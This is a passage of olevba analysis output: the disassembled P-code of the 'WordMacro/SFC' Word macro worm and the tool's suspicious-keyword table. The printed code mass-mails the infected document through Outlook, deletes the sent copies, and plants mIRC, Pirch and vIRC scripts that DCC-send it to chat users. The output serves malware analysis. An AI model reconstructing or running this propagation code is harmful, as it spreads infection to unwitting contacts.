' 	LitStr 0x0039 "O`&ist&eikvsrct&`ohbu&rnou&`ojc*&BI&HIR&ivch&rnou&`ojc(&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	LitStr 0x003A "Or&ou&oh`cercb&qorn&rnou&potsu(&_is&egh&bcjcrc&rnou&`ojc*&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	LitStr 0x0054 "dsr&rnc&potsu&kg&urojj&dc&geropc&uikcqnctc&ih&ist&eikvsrct(&Ri&tckipc&rnou&potsu*&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	LitStr 0x0022 "O&ngpc&ohejsbcb&g&bieskchr&egjjcb&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0015 "&qnoen&eihrgohu&kitc&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	LitStr 0x003C "ohurtseroihu&ih&niq&ri&tckipc&rnou&potsu&`tik&ist&eikvsrct("
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0007 "Rnghmu("
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld OutlookEmail 
' 	MemSt Body 
' Line #83:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld OutlookEmail 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #84:
' 	LitDI2 0x0002 
' 	Ld OutlookEmail 
' 	MemSt Importance 
' Line #85:
' 	LitVarSpecial (True)
' 	Ld OutlookEmail 
' 	MemSt DeleteAfterSubmit 
' Line #86:
' 	Ld OutlookEmail 
' 	ArgsMemCall Send 0x0000 
' Line #87:
' 	Ld Now 
' 	ArgsLd TimeValue 0x0001 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	Ld EmailReg 
' 	Ld EmailContact 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	StartForVariable 
' 	Ld EmlNumber 
' 	EndForVariable 
' 	NextVar 
' Line #90:
' 	StartForVariable 
' 	Ld EN1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld GNS 
' 	ArgsMemLd GetDefaultFolder 0x0001 
' 	MemLd Items 
' 	MemLd Count 
' 	For 
' Line #91:
' 	LitDI2 0x0001 
' 	St EmlSwitch 
' Line #92:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld OutlookApp 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set OE2 
' Line #93:
' 	SetStmt 
' 	Ld EmlSwitch 
' 	LitDI2 0x0004 
' 	Ld GNS 
' 	ArgsMemLd GetDefaultFolder 0x0001 
' 	MemLd Items 
' 	ArgsMemLd Item 0x0001 
' 	Set EmailMsg 
' Line #94:
' 	Ld EmailMsg 
' 	MemLd True 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld EmailMsg 
' 	MemLd True 
' 	Ld OE2 
' 	MemSt True 
' 	EndIf 
' Line #95:
' 	Ld EmailMsg 
' 	MemLd CC 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld EmailMsg 
' 	MemLd CC 
' 	Ld OE2 
' 	MemSt CC 
' 	EndIf 
' Line #96:
' 	Ld EmailMsg 
' 	MemLd BCC 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld EmailMsg 
' 	MemLd BCC 
' 	Ld OE2 
' 	MemSt BCC 
' 	EndIf 
' Line #97:
' 	Ld EmailMsg 
' 	MemLd Subject 
' 	Ld OE2 
' 	MemSt Subject 
' Line #98:
' 	Ld EmailMsg 
' 	MemLd Body 
' 	Ld OE2 
' 	MemSt Body 
' Line #99:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld OE2 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #100:
' 	Ld EmailMsg 
' 	MemLd Importance 
' 	Ld OE2 
' 	MemSt Importance 
' Line #101:
' 	LitVarSpecial (True)
' 	Ld OE2 
' 	MemSt DeleteAfterSubmit 
' Line #102:
' 	Ld OE2 
' 	ArgsMemCall Send 0x0000 
' Line #103:
' 	Ld EmlSwitch 
' 	Paren 
' 	LitDI2 0x0004 
' 	Ld GNS 
' 	ArgsMemLd GetDefaultFolder 0x0001 
' 	MemLd Items 
' 	ArgsMemCall Remove 0x0001 
' Line #104:
' 	Ld EmlSwitch 
' 	LitDI2 0x0001 
' 	Add 
' 	St EmlSwitch 
' Line #105:
' 	StartForVariable 
' 	Ld EN1 
' 	EndForVariable 
' 	NextVar 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	LitStr 0x003C "NMC_YJIEGJYKGENOHCZUi`rqgtcZKoetiui`rZQohbiquZEsttchrPctuoih"
' 	ArgsLd Enc 0x0001 
' 	LitStr 0x000F "Vtiatgk@ojcuBot"
' 	ArgsLd Enc 0x0001 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St PgDir 
' Line #108:
' 	Ld PgDir 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	Ne 
' 	IfBlock 
' Line #109:
' 	StartForVariable 
' 	Ld MircLoop 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' Line #110:
' 	LitStr 0x0007 "E<ZKote"
' 	ArgsLd Enc 0x0001 
' 	LitStr 0x0009 "E<ZKote54"
' 	ArgsLd Enc 0x0001 
' 	Ld PgDir 
' 	LitStr 0x0005 "ZKote"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld PgDir 
' 	LitStr 0x0007 "ZKote54"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	ArgsArray Array 0x0004 
' 	St MircArray 
' Line #111:
' 	Ld MircLoop 
' 	ArgsLd MircArray 0x0001 
' 	Ld fso 
' 	ArgsMemLd FolderExists 0x0001 
' 	IfBlock 
' Line #112:
' 	Ld MircLoop 
' 	ArgsLd MircArray 0x0001 
' 	LitStr 0x000B "ZUetovr(oho"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "]uetovr["
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "h3;&ih&7<LIOH<%<}"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "h0;&)o`&.&"
' 	ArgsLd Enc 0x0001 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0008 "hoem&;;&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000D "kc&/&}&ngjr&{"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "h1;&)kua&"
' 	ArgsLd Enc 0x0001 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0018 "hoem&Ngpc&g&jiim&gr&rnc&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0003 "&</"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "h>;&)bee&uchb&+e&"
' 	ArgsLd Enc 0x0001 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "hoem&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "h?;&{"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	StartForVariable 
' 	Next 
' Line #122:
' 	StartForVariable 
' 	Ld PirchLoop 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' Line #123:
' 	LitStr 0x0008 "E<ZVoten"
' 	ArgsLd Enc 0x0001 
' 	LitStr 0x000A "E<ZVoten54"
' 	ArgsLd Enc 0x0001 
' 	Ld PgDir 
' 	LitStr 0x0006 "ZVoten"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld PgDir 
' 	LitStr 0x0008 "ZVoten54"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	ArgsArray Array 0x0004 
' 	St PirchArray 
' Line #124:
' 	Ld PirchLoop 
' 	ArgsLd PirchArray 0x0001 
' 	Ld fso 
' 	ArgsMemLd FolderExists 0x0001 
' 	IfBlock 
' Line #125:
' 	Ld PirchLoop 
' 	ArgsLd PirchArray 0x0001 
' 	LitStr 0x000B "ZCpchru(oho"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	LitDI2 0x0002 
' 	LitDefault 
' 	Open (For Output)
' Line #126:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "]Jcpcju["
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Chgdjcb;7"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Eishr;0"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Jcpcj7;666+Shmhiqhu"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "666+ShmhiqhuChgdjcb;7"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Jcpcj4;766+Jcpcj&766"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "766+Jcpcj&766Chgdjcb;7"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Jcpcj5;466+Jcpcj&466"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "466+Jcpcj&466Chgdjcb;7"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Jcpcj2;566+Jcpcj&566"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "566+Jcpcj&566Chgdjcb;7"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Jcpcj3;266+Jcpcj&266"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "266+Jcpcj&266Chgdjcb;7"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Jcpcj0;366+Jcpcj&366"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "366+Jcpcj&366Chgdjcb;7"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "]666+Shmhiqhu["
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "SuctEishr;6"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Cpchr7;IH&LIOH<%<)kua&"
' 	ArgsLd Enc 0x0001 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "hoem&Jiim&gr&rnc&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0003 "&</"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "CpchrEishr;6"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "]766+Jcpcj&766["
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Suct7;,',F,"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "SuctEishr;7"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Cpchr7;IH&LIOH<%<)bee&uchb&"
' 	ArgsLd Enc 0x0001 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "hoem&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "CpchrEishr;7"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "]466+Jcpcj&466["
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #154:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "SuctEishr;6"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "CpchrEishr;6"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "]566+Jcpcj&566["
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "SuctEishr;6"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "CpchrEishr;6"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #161:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "]266+Jcpcj&266["
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "SuctEishr;6"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "CpchrEishr;6"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #164:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #165:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "]366+Jcpcj&366["
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "SuctEishr;6"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #167:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "CpchrEishr;6"
' 	ArgsLd Enc 0x0001 
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0002 
' 	Close 0x0001 
' Line #169:
' 	EndIfBlock 
' Line #170:
' 	StartForVariable 
' 	Next 
' Line #171:
' 	StartForVariable 
' 	Ld VircLoop 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' Line #172:
' 	LitStr 0x0007 "E<ZPote"
' 	ArgsLd Enc 0x0001 
' 	LitStr 0x0009 "E<ZPote54"
' 	ArgsLd Enc 0x0001 
' 	Ld PgDir 
' 	LitStr 0x0005 "ZPote"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld PgDir 
' 	LitStr 0x0007 "ZPote54"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	ArgsArray Array 0x0004 
' 	St VircArray 
' Line #173:
' 	Ld VircLoop 
' 	ArgsLd VircArray 0x0001 
' 	Ld fso 
' 	ArgsMemLd FolderExists 0x0001 
' 	IfBlock 
' Line #174:
' 	LitStr 0x0009 "bee&uchb&"
' 	ArgsLd Enc 0x0001 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "hoem&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	LitStr 0x0042 "NMC_YSUCTUZ(BC@GSJRZUi`rqgtcZKcagjorn&Ui`rqgtcZPousgj&OTE?0ZCpchru"
' 	ArgsLd Enc 0x0001 
' 	LitStr 0x0007 "Cpchr71"
' 	ArgsLd Enc 0x0001 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #175:
' 	EndIfBlock 
' Line #176:
' 	StartForVariable 
' 	Next 
' Line #177:
' 	EndIfBlock 
' Line #178:
' 	ElseBlock 
' Line #179:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #180:
' 	EndIfBlock 
' Line #181:
' 	EndSub 
' Line #182:
' 	FuncDefn (Sub ToolsMacro())
' Line #183:
' 	EndSub 
' Line #184:
' 	FuncDefn (Sub ViewVBCode())
' Line #185:
' 	EndSub 
' Line #186:
' 	FuncDefn (Sub FileTemplates())
' Line #187:
' 	EndSub 
' Line #188:
' 	FuncDefn (Function Enc(TextStr))
' Line #189:
' 	StartForVariable 
' 	Ld LenLoop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TextStr 
' 	FnLen 
' 	For 
' Line #190:
' 	Ld Enc 
' 	Ld TextStr 
' 	Ld LenLoop 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0006 
' 	LitDI2 0x00FF 
' 	Mod 
' 	Paren 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Enc 
' Line #191:
' 	StartForVariable 
' 	Next 
' Line #192:
' 	EndFunc 
' Line #193:
' 	QuoteRem 0x0000 0x0015 " WordMacro/SFC by Zed"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |(eN                 |KGVO                                         |
|String    |                    |                                             |
|Base64    |eZ-z~x              |ZVoten54                                     |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

